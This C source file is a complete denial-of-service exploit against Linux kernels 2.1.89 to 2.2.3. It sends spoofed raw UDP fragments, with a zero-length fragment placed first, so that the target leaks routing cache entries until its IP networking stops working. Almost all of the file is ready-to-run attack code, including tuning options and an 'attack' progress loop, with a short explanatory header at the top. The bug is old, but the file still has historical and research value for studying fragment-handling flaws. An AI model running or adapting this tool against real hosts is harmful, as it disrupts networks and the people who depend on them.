/*
 * sesquipedalian.c - Demonstrates a DoS bug in Linux 2.1.89 - 2.2.3
 *
 * by horizon <jmcdonal@unf.edu>
 *
 * This sends a series of IP fragments such that a 0 length fragment is first
 * in the fragment list. This causes a reference count on the cached routing
 * information for that packet's originator to be incremented one extra time.
 * This makes it impossible for the kernel to deallocate the destination entry
 * and remove it from the cache.
 *
 * If we send enough fragments such that there are at least 4096 stranded
 * dst cache entries, then the target machine will no longer be able to
 * allocate new cache entries, and IP communication will be effectively
 * disabled. You will need to set the delay such that packets are not being
 * dropped, and you will probably need to let the program run for a few
 * minutes to have the full effect. This was written for OpenBSD and Linux.
 *
 * Thanks to vacuum, colonwq, duke, rclocal, sygma, and antilove for testing.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

struct my_ip_header
{
	unsigned char  ip_hl:4,         /* header length */
		ip_v:4;               /* version */
	unsigned char  ip_tos;          /* type of service */
	unsigned short ip_len;          /* total length */
	unsigned short ip_id;           /* identification */
	unsigned short ip_off;          /* fragment offset field */
#define IP_RF 0x8000                    /* reserved fragment flag */
#define IP_DF 0x4000                    /* dont fragment flag */
#define IP_MF 0x2000                    /* more fragments flag */
#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
	unsigned char  ip_ttl;          /* time to live */
	unsigned char  ip_p;                    /* protocol */
	unsigned short ip_sum;          /* checksum */
	unsigned long ip_src, ip_dst; /* source and dest address */
};

struct my_udp_header
{
	unsigned short uh_sport;
	unsigned short uh_dport;
	unsigned short uh_ulen;
	unsigned short uh_sum;
};

#define IHLEN (sizeof (struct my_ip_header))
#define UHLEN (sizeof (struct my_udp_header))

#ifdef __OpenBSD__
#define EXTRA 8
#else
#define EXTRA 0
#endif

unsigned short checksum(unsigned short *data,unsigned short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

unsigned long resolve( char *hostname)
{
	long result;
	struct hostent *hp;

	if ((result=inet_addr(hostname))==-1)
	{
		if ((hp=gethostbyname(hostname))==0)
		{
			fprintf(stderr,"Can't resolve target.\n");
			exit(1);
		}
		bcopy(hp->h_addr,&result,4);
	}
	return result;
}

void usage(void)
{
	fprintf(stderr,"usage: ./sqpd [-s sport] [-d dport] [-n count] [-u delay] source target\n");
	exit(0);
}


void sendem(int s, unsigned long source, unsigned long dest,
		unsigned short sport, unsigned short dport)
{
	static char buffer[8192];
	struct my_ip_header *ip;
	struct my_udp_header *udp;
	struct sockaddr_in sa;

	bzero(&sa,sizeof(struct sockaddr_in));
	sa.sin_family=AF_INET;
	sa.sin_port=htons(sport);
	sa.sin_addr.s_addr=dest;

	bzero(buffer,IHLEN+32);
	
	ip=(struct my_ip_header *)buffer;
	udp=(struct my_udp_header *)&(buffer[IHLEN]);

	ip->ip_v = 4;
	ip->ip_hl = IHLEN >>2;
	ip->ip_tos = 0;
	ip->ip_id = htons(random() & 0xFFFF);
	ip->ip_ttl = 142;
	ip->ip_p = IPPROTO_UDP;
	ip->ip_src = source;
	ip->ip_dst = dest;
	udp->uh_sport = htons(sport);
	udp->uh_dport = htons(dport);
	udp->uh_ulen = htons(64-UHLEN);
	udp->uh_sum = 0;

	/* Our first fragment will have an offset of 0, and be 32 bytes
	   long. This gets added as the only element in the fragment
	   list. */

	ip->ip_len = htons(IHLEN+32);
	ip->ip_off = htons(IP_MF);
	ip->ip_sum = 0;
	ip->ip_sum = checksum((u_short *)buffer,IHLEN+32);

	if (sendto(s,buffer,IHLEN+32,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
	{
		perror("sendto");
		exit(1);
	}

	/* Our second fragment will have an offset of 0, and a 0 length.
	   This gets added to the list before our previous fragment,
	   making it first in line. */

	ip->ip_len = htons(IHLEN);
	ip->ip_off = htons(IP_MF);
	ip->ip_sum = 0;
	ip->ip_sum = checksum((u_short *)buffer,IHLEN);

	if (sendto(s,buffer,IHLEN+EXTRA,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
	{
		perror("sendto");
		exit(1);
	}

	/* Our third and final frag has an offset of 4 (32 bytes), and a
	   length of 32 bytes. This passes our three frags up to ip_glue. */

	ip->ip_len = htons(IHLEN+32);
	ip->ip_off = htons(32/8);
	ip->ip_sum = 0;
	ip->ip_sum = checksum((u_short *)buffer,IHLEN+32);

	if (sendto(s,buffer,IHLEN+32,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
	{
		perror("sendto");
		exit(1);
	}
}

int main(int argc, char **argv)
{
	int sock;
	int on=1,i;
	unsigned long source, dest;
	unsigned short sport=53, dport=16384;
	int delay=20000, count=15000;

	if (argc<3)
		usage();	

	while ((i=getopt(argc,argv,"s:d:n:u:"))!=-1)
	{
		switch (i)
		{
			case 's': sport=atoi(optarg);
				  break;
			case 'd': dport=atoi(optarg);
				  break;
			case 'n': count=atoi(optarg);
				  break;
			case 'u': delay=atoi(optarg);
				  break;
			default:  usage();
		}
	}
	
	argc-=optind;
	argv+=optind;

	source=resolve(argv[0]);
        dest=resolve(argv[1]);

	srandom(time((time_t)0)*getpid());

	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("socket");
		exit(1);
	}

	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0)
	{
		perror("setsockopt: IP_HDRINCL");
		exit(1);
	}

	fprintf(stdout,"\nStarting attack on %s ...",argv[1]);

	for (i=0; i<count; i++)
	{
		sendem(sock,source+htonl(i),dest,sport,dport);
		if (!(i%2))
			usleep(delay);
		if (!(i%100))
		{
			if (!(i%2000))
				fprintf(stdout,"\n");
			fprintf(stdout,".");
			fflush(stdout);
		}
	}

	fprintf(stdout,"\nDone.\n");
	exit(1);
}

